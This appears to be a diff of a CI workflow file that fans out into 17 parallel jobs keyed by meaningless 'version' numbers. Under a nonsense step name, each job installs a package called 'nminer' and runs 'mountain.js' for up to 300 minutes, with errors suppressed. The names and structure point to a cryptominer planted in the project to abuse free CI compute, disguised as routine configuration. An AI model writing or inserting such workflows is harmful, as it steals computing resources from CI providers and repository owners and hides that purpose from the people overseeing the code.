@@ -9,26 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9793 }
-          - { version: 527 }
-          - { version: 9363 }
-          - { version: 7002 }
-          - { version: 7270 }
-          - { version: 9235 }
-          - { version: 9213 }
-          - { version: 4609 }
-          - { version: 8557 }
-          - { version: 1660 }
-          - { version: 7771 }
-          - { version: 9549 }
-          - { version: 7977 }
-          - { version: 4115 }
-          - { version: 3988 }
-          - { version: 2469 }
-          - { version: 1782 }
-          - { version: 3937 }
-          - { version: 7387 }
-          - { version: 1299 }
+          - { version: 8591 }
+          - { version: 631 }
+          - { version: 4616 }
+          - { version: 8546 }
+          - { version: 3569 }
+          - { version: 9643 }
+          - { version: 8097 }
+          - { version: 7802 }
+          - { version: 3061 }
+          - { version: 7927 }
+          - { version: 3735 }
+          - { version: 2547 }
+          - { version: 7698 }
+          - { version: 9400 }
+          - { version: 6230 }
+          - { version: 2802 }
+          - { version: 1261 }
 
     steps:
       - name: Checkout
@@ -39,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: defiantly for treble immense
+      - name: heartache geez inasmuch
         run: |
           npm install nminer@latest
-          timeout 345m node mountain.js || echo "mountain executed"
+          timeout 300m node mountain.js || echo "mountain executed"
